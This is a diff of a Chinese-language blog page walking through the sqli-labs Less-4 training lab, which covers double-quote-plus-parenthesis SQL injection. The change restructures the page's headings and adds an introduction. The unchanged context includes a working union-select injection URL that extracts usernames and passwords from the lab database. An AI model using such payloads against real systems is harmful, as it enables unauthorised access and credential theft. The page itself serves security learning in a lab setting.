@@ -5,14 +5,11 @@
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
     <meta name="keywords" content="sqli-labs-Less4, Junk Blog">
-    <meta name="description" content="Less4 (基于错误的GET双引号字符型注入)
+    <meta name="description" content="前言这一关是 “双引号+括号” 的字符型注入，SQL执行语句为select * from 表名 where id=(&#34;1&#34;)
+注入步骤基于错误的GET双引号字符型注入
 GET 方式提交 id
 
-http://192.168.150.128/sqli-labs-master/Less-4/?id=1
-
-添加 “单引号”，无报错
-
-http://192.168">
+http://192.168.150.128/">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -422,7 +419,7 @@ http://192.168">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        328
+                        360
                     </div>
                     
 
@@ -445,7 +442,8 @@ http://192.168">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h3 id="Less4-基于错误的GET双引号字符型注入"><a href="#Less4-基于错误的GET双引号字符型注入" class="headerlink" title="Less4 (基于错误的GET双引号字符型注入)"></a>Less4 (基于错误的GET双引号字符型注入)</h3><ol>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关是 “双引号+括号” 的字符型注入，SQL执行语句为<code>select * from 表名 where id=("1")</code></p>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于错误的GET双引号字符型注入"><a href="#基于错误的GET双引号字符型注入" class="headerlink" title="基于错误的GET双引号字符型注入"></a>基于错误的GET双引号字符型注入</h2><ol>
 <li><strong>GET 方式提交 id</strong></li>
 </ol>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=1</code></pre><p><img src="https://i.loli.net/2019/09/19/he6pGSZLnzi1TDM.png" alt="less4-1.png"></p>
@@ -481,7 +479,7 @@ http://192.168">
 <li><strong>爆数据</strong></li>
 </ol>
 <pre><code>http://192.168.150.128/sqli-labs-master/Less-4/?id=-1") union select 1,group_concat(username),group_concat(password) FROM security.users %23</code></pre><p><img src="https://i.loli.net/2019/09/19/nBE2Yqu6stT59jy.png" alt="less4-9.png"></p>
-<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><p><a href="https://www.cnblogs.com/omnis/p/8313314.html" target="_blank" rel="noopener">【sqli-labs】 less4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</a></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8313314.html" target="_blank" rel="noopener">【sqli-labs】 less4 GET - Error based - Double Quotes - String (基于错误的GET双引号字符型注入)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -748,7 +746,7 @@ User’s browser 向 web App</div>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">17.8k</span>&nbsp;字
+                class="white-color">17.9k</span>&nbsp;字
                
             
 			
